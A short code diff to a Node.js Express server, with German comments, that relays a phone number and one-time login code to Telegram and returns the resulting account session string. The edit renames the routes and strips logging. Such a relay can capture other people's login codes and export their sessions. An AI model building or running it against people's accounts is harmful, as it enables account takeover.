@@ -15,56 +15,44 @@ const client = new TelegramClient(stringSession, apiId, apiHash, {
     connectionRetries: 5,
 });
 
-// WICHTIG: Einmal global verbinden, nicht bei jeder Anfrage
 let isConnected = false;
 async function ensureConnection() {
     if (!isConnected) {
         await client.connect();
         isConnected = true;
-        console.log("Telegram Client verbunden.");
     }
 }
 
 let currentPhoneCodeHash = '';
 
-app.post('/send-code', async (req, res) => {
+// Diese Routen passen jetzt genau zu deinem Frontend-Code
+app.post('/send-otp', async (req, res) => {
     const { phone } = req.body;
     try {
         await ensureConnection();
-        const result = await client.sendCode({
-            apiId,
-            apiHash,
-        }, phone);
-        
+        const result = await client.sendCode({ apiId, apiHash }, phone);
         currentPhoneCodeHash = result.phoneCodeHash;
-        console.log("Code gesendet für:", phone);
         res.json({ success: true });
     } catch (err) {
-        console.error("Fehler bei sendCode:", err);
         res.status(500).json({ error: err.message });
     }
 });
 
-app.post('/verify-code', async (req, res) => {
+app.post('/verify-otp', async (req, res) => {
     const { phone, phoneCode } = req.body;
     try {
         await ensureConnection();
-        
-        // signIn Prozess
-        const user = await client.signIn({
+        await client.signIn({
             phoneNumber: phone,
             phoneCode: phoneCode,
             phoneCodeHash: currentPhoneCodeHash
         });
         
-        // Session speichern
         const sessionString = client.session.save();
-        console.log("Session erhalten!");
         res.json({ success: true, session: sessionString });
     } catch (err) {
-        console.error("Fehler bei signIn:", err);
         res.status(500).json({ error: err.message });
     }
 });
 
-app.listen(3000, () => console.log('Server läuft auf Port 3000'));
+app.listen(process.env.PORT || 3000, () => console.log('Server läuft.'));
